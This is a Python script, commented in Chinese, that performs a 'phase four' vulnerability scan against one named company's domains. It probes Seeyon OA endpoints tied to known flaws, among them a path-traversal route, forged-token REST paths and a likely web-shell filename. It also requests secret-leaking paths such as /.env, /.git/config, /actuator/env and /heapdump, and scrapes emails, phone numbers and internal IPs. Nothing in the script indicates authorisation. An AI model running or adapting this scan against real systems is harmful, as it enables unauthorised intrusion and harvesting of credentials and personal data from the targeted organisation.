#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
第四阶段: erp.hbwfjt.com 深度漏洞扫描
- 致远OA (8088端口)
- 物流平台 (7001端口)
- 主站安全头检测
"""

import requests
import socket
import json
import time
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,*/*",
    "Accept-Language": "zh-CN,zh;q=0.9",
})

# ============================================================
# 1. 致远OA 8088端口深度扫描
# ============================================================
print("=" * 80)
print("  [1] 致远OA 深度扫描 (erp.hbwfjt.com:8088)")
print("=" * 80)

oa_base = "http://erp.hbwfjt.com:8088"

# 致远OA常见漏洞路径
oa_paths = [
    "/seeyon/",
    "/seeyon/index.jsp",
    "/seeyon/common/office/license.js",
    "/seeyon/common/design㎎r/print.jsp",
    "/seeyon/getAjaxDataServlet",
    "/seeyon/main.do?method=login",
    "/seeyon/rest/authentication/ucpcLogin",
    "/seeyon/rest/token/eyJhbGciOiJIUzI1NiJ9",
    "/seeyon/autoinstall.do.css/..;/ajax.do",
    "/seeyon/test123456.jsp",
    "/seeyon/webmail.do?method=doDownloadAtt",
    "/seeyon/downloadServlet",
    "/seeyon/rest/orgMember",
    "/seeyon/rest/orgDepartment",
    "/seeyon/rest/token",
    "/seeyon/login.html",
    "/seeyon/login.jsp",
    "/seeyon/management/status",
    "/seeyon/management/index.jsp",
    "/seeyon/thirdpartyController.do",
    "/seeyon/rest/authentication/nonce",
    "/seeyon/rest/orgDepartment/list",
    "/seeyon/main.do",
    "/seeyon/rest/token/xxx",
    "/seeyon/rest/authentication/token",
    "/seeyon/wpsAssistServlet",
    "/seeyon/rest/token/eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcyMDAwMDAwMH0/test",
    "/seeyon/rest/authentication/lockStatus",
    "/seeyon/rest/orgDepartment",
    "/seeyon/rest/orgMember/list",
]

print(f"\n  探测致远OA路径:")
for path in oa_paths:
    try:
        time.sleep(0.3)
        url = f"{oa_base}{path}"
        r = session.get(url, timeout=8, allow_redirects=False)
        
        if r.status_code == 200 and len(r.content) > 0:
            content_type = r.headers.get("Content-Type", "")
            print(f"  ✅ {path} -> {r.status_code} | {len(r.content)} bytes | {content_type[:40]}")
            
            # 特殊检测
            if "license" in path and "___OfficeLicese" in r.text:
                match = re.search(r'授权(.+?)\[', r.text)
                org = match.group(1) if match else "未知"
                print(f"     📋 泄露授权信息: {org}")
            
            if "status" in path:
                print(f"     📋 内容: {r.text[:200]}")
                
        elif r.status_code in [301, 302, 303, 307, 308]:
            loc = r.headers.get("Location", "")
            print(f"  ↪️  {path} -> {r.status_code} -> {loc[:60]}")
        elif r.status_code == 403:
            print(f"  🔒 {path} -> 403 Forbidden")
        elif r.status_code == 404:
            pass  # 不输出404
    except Exception as e:
        pass

# ============================================================
# 2. 物流平台 7001端口深度扫描
# ============================================================
print(f"\n{'='*80}")
print("  [2] 物流平台深度扫描 (erp.hbwfjt.com:7001)")
print(f"{'='*80}")

logistics_base = "http://erp.hbwfjt.com:7001"

logistics_paths = [
    "/",
    "/login",
    "/api/",
    "/admin/",
    "/swagger-ui.html",
    "/v2/api-docs",
    "/v3/api-docs",
    "/doc.html",
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/actuator/info",
    "/druid/",
    "/druid/index.html",
    "/console/",
    "/manager/",
    "/system/",
    "/config/",
    "/.env",
    "/.git/config",
    "/robots.txt",
    "/sitemap.xml",
    "/index.html",
    "/home",
    "/dashboard",
    "/monitor",
    "/health",
    "/info",
    "/env",
    "/metrics",
    "/trace",
    "/dump",
    "/heapdump",
    "/jolokia",
    "/gateway/routes",
    "/nacos/",
    "/eureka/",
]

print(f"\n  探测物流平台路径:")
for path in logistics_paths:
    try:
        time.sleep(0.2)
        url = f"{logistics_base}{path}"
        r = session.get(url, timeout=8, allow_redirects=False)
        
        if r.status_code == 200 and len(r.content) > 0:
            content_type = r.headers.get("Content-Type", "")
            # 获取标题
            title = ""
            if "text/html" in content_type:
                t = re.search(r'<title>(.*?)</title>', r.text[:5000], re.DOTALL)
                if t:
                    title = t.group(1).strip()[:60]
            
            print(f"  ✅ {path} -> {r.status_code} | {len(r.content)} bytes | {title or content_type[:40]}")
        elif r.status_code in [301, 302, 303, 307, 308]:
            loc = r.headers.get("Location", "")
            print(f"  ↪️  {path} -> {r.status_code} -> {loc[:60]}")
        elif r.status_code == 403:
            print(f"  🔒 {path} -> 403 Forbidden")
    except:
        pass

# ============================================================
# 3. 主站安全头检测 (重新获取)
# ============================================================
print(f"\n{'='*80}")
print("  [3] 主站安全头检测 (www.hbwfjt.com)")
print(f"{'='*80}")

try:
    time.sleep(3)
    r = session.get("https://www.hbwfjt.com/", timeout=15)
    
    print(f"  状态码: {r.status_code}")
    print(f"  Server: {r.headers.get('Server', 'N/A')}")
    
    if r.status_code == 200:
        # 安全头
        headers_to_check = [
            ("Strict-Transport-Security", "HSTS"),
            ("Content-Security-Policy", "CSP"),
            ("X-Content-Type-Options", "X-Content-Type-Options"),
            ("X-Frame-Options", "X-Frame-Options"),
            ("X-XSS-Protection", "X-XSS-Protection"),
            ("Referrer-Policy", "Referrer-Policy"),
            ("Permissions-Policy", "Permissions-Policy"),
        ]
        
        print(f"\n  安全响应头:")
        for header, name in headers_to_check:
            value = r.headers.get(header)
            if value:
                print(f"  ✅ {name}: {value[:60]}")
            else:
                print(f"  ❌ {name}: 未设置")
        
        # Cookie安全
        print(f"\n  Cookie检测:")
        cookies = r.headers.get("Set-Cookie", "")
        if cookies:
            print(f"  Set-Cookie: {cookies[:200]}")
            issues = []
            if "httponly" not in cookies.lower():
                issues.append("缺少HttpOnly")
            if "secure" not in cookies.lower():
                issues.append("缺少Secure")
            if "samesite" not in cookies.lower():
                issues.append("缺少SameSite")
            if issues:
                print(f"  ⚠️ 问题: {', '.join(issues)}")
        
        # 页面分析
        body = r.text
        title = re.search(r'<title>(.*?)</title>', body, re.DOTALL)
        if title:
            print(f"\n  页面标题: {title.group(1).strip()[:80]}")
        
        # 提取链接
        links = re.findall(r'href=["\']([^"\']*)["\']', body)
        internal = [l for l in links if l.startswith("/") or "hbwfjt.com" in l]
        print(f"  内部链接: {len(internal)} 个")
        
        # 提取敏感信息
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)
        if emails:
            print(f"  邮箱: {list(set(emails))[:10]}")
        
        phones = re.findall(r'(?:1[3-9]\d{9}|0\d{2,3}-?\d{7,8})', body)
        if phones:
            print(f"  电话: {list(set(phones))[:10]}")
        
        internal_ips = re.findall(r'(?:10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)', body)
        if internal_ips:
            print(f"  内部IP: {list(set(internal_ips))}")
        
        # 提取路径
        paths = sorted(set([l.split("?")[0] for l in internal if l.startswith("/") and len(l) > 3]))
        if paths:
            print(f"\n  内部路径 ({len(paths)}个):")
            for p in paths[:30]:
                print(f"    {p}")
    elif r.status_code == 429:
        print(f"  ⚠️ 主站返回429限频，等待后重试...")
        
except Exception as e:
    print(f"  检测失败: {e}")

# ============================================================
# 4. 8090端口探测
# ============================================================
print(f"\n{'='*80}")
print("  [4] 8090端口探测 (erp.hbwfjt.com)")
print(f"{'='*80}")

try:
    for scheme in ["http", "https"]:
        try:
            url = f"{scheme}://erp.hbwfjt.com:8090/"
            r = session.get(url, timeout=8)
            print(f"  {scheme}://erp.hbwfjt.com:8090/ -> {r.status_code} | {len(r.content)} bytes")
            print(f"  Server: {r.headers.get('Server', 'N/A')}")
            print(f"  Content-Type: {r.headers.get('Content-Type', 'N/A')}")
            if r.status_code == 200:
                title = re.search(r'<title>(.*?)</title>', r.text[:5000], re.DOTALL)
                if title:
                    print(f"  标题: {title.group(1).strip()[:60]}")
            break
        except:
            pass
except Exception as e:
    print(f"  探测失败: {e}")

# ============================================================
# 5. 9090端口探测
# ============================================================
print(f"\n{'='*80}")
print("  [5] 9090端口探测 (erp.hbwfjt.com)")
print(f"{'='*80}")

try:
    for scheme in ["http", "https"]:
        try:
            url = f"{scheme}://erp.hbwfjt.com:9090/"
            r = session.get(url, timeout=8)
            print(f"  {scheme}://erp.hbwfjt.com:9090/ -> {r.status_code} | {len(r.content)} bytes")
            print(f"  Server: {r.headers.get('Server', 'N/A')}")
            print(f"  Content-Type: {r.headers.get('Content-Type', 'N/A')}")
            if r.status_code == 200:
                title = re.search(r'<title>(.*?)</title>', r.text[:5000], re.DOTALL)
                if title:
                    print(f"  标题: {title.group(1).strip()[:60]}")
            break
        except:
            pass
except Exception as e:
    print(f"  探测失败: {e}")

print(f"\n{'='*80}")
print("  扫描完成")
print(f"{'='*80}")
